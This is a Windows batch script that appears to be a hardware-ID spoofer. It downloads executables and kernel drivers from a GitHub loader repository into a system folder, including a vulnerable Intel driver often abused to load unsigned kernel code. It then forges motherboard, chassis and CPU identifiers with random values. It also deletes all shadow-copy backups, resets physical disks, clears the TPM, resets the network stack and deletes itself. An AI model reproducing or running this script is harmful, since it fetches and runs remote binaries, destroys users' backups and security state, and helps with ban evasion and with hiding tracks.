@echo off
setlocal EnableDelayedExpansion

:: Set save location
set "targetDir=C:\Windows\apppatch\Custom\Custom64"

:: Download files
bitsadmin /transfer get1 /priority foreground ^
 https://github.com/msxredx11/loader/raw/refs/heads/main/H2OSDE-W.exe ^
 "%targetDir%\H2OSDE-W.exe"
bitsadmin /transfer get2 /priority foreground ^
 https://github.com/msxredx11/loader/raw/refs/heads/main/Solution.exe ^
 "%targetDir%\Solution.exe"
bitsadmin /transfer get3 /priority foreground ^
 https://github.com/msxredx11/loader/raw/refs/heads/main/Solution64.sys ^
 "%targetDir%\Solution64.sys"
bitsadmin /transfer get4 /priority foreground ^
 https://github.com/msxredx11/loader/raw/refs/heads/main/iqvw64e.sys ^
 "%targetDir%\iqvw64e.sys"
bitsadmin /transfer get5 /priority foreground ^
 https://github.com/msxredx11/loader/raw/refs/heads/main/winxsrcsv64.exe ^
 "%targetDir%\winxsrcsv64.exe"
bitsadmin /transfer get6 /priority foreground ^
 https://github.com/msxredx11/loader/raw/refs/heads/main/winxsrcsv64.sys ^
 "%targetDir%\winxsrcsv64.sys"

cd /d "%targetDir%"

:: Define brands
set brands=MSI GIGABYTE ASROCK ASUS BIOSTAR
set /a randBrand=%random% %% 5
for %%B in (%brands%) do (
    if !randBrand! == 0 set "brand=%%B"
    set /a randBrand-=1
)

:: Random date
set /a year=2022 + (%random% %% 3)
set /a month=1 + (%random% %% 12)
if %month% LSS 10 set "month=0%month%"
set /a day=1 + (%random% %% 28)
if %day% LSS 10 set "day=0%day%"
set "rdate=%month%/%day%/%year%"

:: Random serials
set "uuid=%random%%random%-%random%-%random%-%random%-%random%%random%"
set /a sn1=%random%%random%
set /a sn2=%random%%random%
set /a sn3=%random%%random%
set /a sn4=%random%%random%
set "SSN=T%random%%random%"
set "BSN=Z%random%%random%"
set "CSN=TU%random%%random%"
set "PSN=%random%%random%%random%"

:: Random CPU
set cpus=i5 i7 i9
set /a randCpu=%random% %% 3
for %%C in (%cpus%) do (
    if !randCpu! == 0 set "cpuSeries=%%C"
    set /a randCpu-=1
)
set /a cpuGen=10 + (%random% %% 5)
set /a cpuModel=900 + (%random% %% 100)
set "cpuFinal=INTEL-%cpuSeries%-%cpuGen%%cpuModel%K"

:: Execute spoofing with Solution.exe
Solution.exe /IVN "%brand%"
Solution.exe /IV "2.05 Rev.C"
Solution.exe /ID "%rdate%"
Solution.exe /SM "%brand% TECHNOLOGY CO., LTD."
Solution.exe /SP "%brand% Z790 ELITE"
Solution.exe /SV "C.01, Rev 4.3, %rdate%"
Solution.exe /SS "%SSN%"
Solution.exe /SU AUTO
Solution.exe /SK "SKU-%sn1%-%brand%-Z790E"
Solution.exe /SF "%brand% Elite Series"
Solution.exe /BM "%brand% TECHNOLOGY CO., LTD."
Solution.exe /BP "%brand% Z790 ELITE"
Solution.exe /BV "Rev 4.3"
Solution.exe /BS "%BSN%"
Solution.exe /BT "AT-GZ790E%sn2%"
Solution.exe /CM "%brand% TECHNOLOGY CO., LTD."
Solution.exe /CT "0Ah"
Solution.exe /CV "Rev. H"
Solution.exe /CS "%CSN%"
Solution.exe /CA "%brand%-Z790E"
Solution.exe /CO "00000014h"
Solution.exe /PSN "%PSN%"
Solution.exe /PAT "CPU-Z790E-ELITE-05"
Solution.exe /PPN "%cpuFinal%"

:: Execute same commands with winxsrcsv64.exe
winxsrcsv64.exe /IVN "%brand%"
winxsrcsv64.exe /IV "2.05 Rev.C"
winxsrcsv64.exe /ID "%rdate%"
winxsrcsv64.exe /SM "%brand% TECHNOLOGY CO., LTD."
winxsrcsv64.exe /SP "%brand% Z790 ELITE"
winxsrcsv64.exe /SV "C.01, Rev 4.3, %rdate%"
winxsrcsv64.exe /SS "%SSN%"
winxsrcsv64.exe /SU AUTO
winxsrcsv64.exe /SK "SKU-%sn1%-%brand%-Z790E"
winxsrcsv64.exe /SF "%brand% Elite Series"
winxsrcsv64.exe /BM "%brand% TECHNOLOGY CO., LTD."
winxsrcsv64.exe /BP "%brand% Z790 ELITE"
winxsrcsv64.exe /BV "Rev 4.3"
winxsrcsv64.exe /BS "%BSN%"
winxsrcsv64.exe /BT "AT-GZ790E%sn2%"
winxsrcsv64.exe /CM "%brand% TECHNOLOGY CO., LTD."
winxsrcsv64.exe /CT "0Ah"
winxsrcsv64.exe /CV "Rev. H"
winxsrcsv64.exe /CS "%CSN%"
winxsrcsv64.exe /CA "%brand%-Z790E"
winxsrcsv64.exe /CO "00000014h"
winxsrcsv64.exe /PSN "%PSN%"
winxsrcsv64.exe /PAT "CPU-Z790E-ELITE-05"
winxsrcsv64.exe /PPN "%cpuFinal%"

:: Cleanup and network reset
ipconfig /flushdns >nul
powershell vssadmin delete shadows /all >nul
powershell Reset-PhysicalDisk * >nul
powershell.exe Clear-Tpm
powershell.exe Disable-TpmAutoProvisioning
netsh interface set interface "Ethernet" admin=enable
ipconfig /flushdns
ipconfig /registerdns
ipconfig /release
ipconfig /renew

powershell.exe Set-NetAdapterAdvancedProperty -Name "Ethernet" -DisplayName "UDP Checksum Offload (IPv6)" -DisplayValue "Disabled"
powershell.exe Set-NetAdapterAdvancedProperty -Name "Ethernet" -DisplayName "TCP Checksum Offload (IPv6)" -DisplayValue "Disabled"
powershell.exe Set-NetAdapterAdvancedProperty -Name "Ethernet" -DisplayName "Large Send Offload v2 (IPv6)" -DisplayValue "Disabled"
powershell.exe Set-NetAdapterAdvancedProperty -Name "Ethernet" -DisplayName "IPv4 Checksum Offload" -DisplayValue "Disabled"
powershell.exe Set-NetAdapterAdvancedProperty -Name "Ethernet" -DisplayName "Flow Control" -DisplayValue "Disabled"
powershell.exe Set-NetAdapterAdvancedProperty -Name "Ethernet" -DisplayName "ARP Offload" -DisplayValue "Disabled"
powershell.exe Set-NetAdapterAdvancedProperty -Name "Ethernet" -DisplayName "Network Address" -DisplayValue "Not Present"
powershell.exe Set-NetAdapterAdvancedProperty -Name "Ethernet" -DisplayName "Energy Efficient Ethernet" -DisplayValue "Disabled"

ipconfig /flushdns >nul
netsh int ip reset >nul
netsh int ipv4 reset >nul
netsh int ipv6 reset >nul
reg add "HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\MultifunctionAdapter\0\DiskController\0\DiskPeripheral\0" /v Identifier /t REG_SZ /d %random%-%random% /f

powershell vssadmin delete shadows /all >nul

:: Self-delete
DEL "%~f0"
